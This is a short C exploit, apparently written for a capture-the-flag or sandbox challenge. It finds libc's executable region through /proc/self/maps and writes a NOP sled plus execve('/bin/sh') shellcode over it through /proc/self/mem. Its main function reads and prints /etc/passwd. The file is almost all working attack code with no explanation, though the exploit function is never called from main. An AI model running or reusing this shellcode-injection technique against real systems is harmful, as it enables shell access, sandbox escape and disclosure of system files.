#include <fcntl.h>
#include <stdio.h>
#include <string.h>

unsigned char shellcode[0x27a50 + 0x100 + 0x100];
unsigned char sc[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69"
                     "\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

int exp() {
  char buf[0x1000];
  int fd = openat(1, "/proc/self/maps", O_RDONLY);
  FILE *fd_maps = fdopen(fd, "r");

  int mem = openat(1, "/proc/self/mem", O_RDWR);

  unsigned long long addr;
  while (fgets(buf, sizeof(buf), fd_maps)) {
    if (strstr(buf, "r-xp") && strstr(buf, "lib/libc-")) {

      sscanf(buf, "%llx-", &addr);
      printf("%s", buf);
    }
  }
  printf("%llx", addr);

  memset(shellcode, 0x90, 0x27a50 + 0x100);
  memcpy(shellcode + 0x27a50 + 0x100, sc, sizeof(sc));

  lseek(mem, addr, SEEK_SET);
  write(mem, shellcode, sizeof(shellcode));
  return 0;
}

int main() {
  char buf[0x100];
  int fd = openat(1, "/etc/passwd", O_RDONLY);
  ssize_t len = read(fd, buf, sizeof(buf));
  write(1, buf, len);
  return 0;
}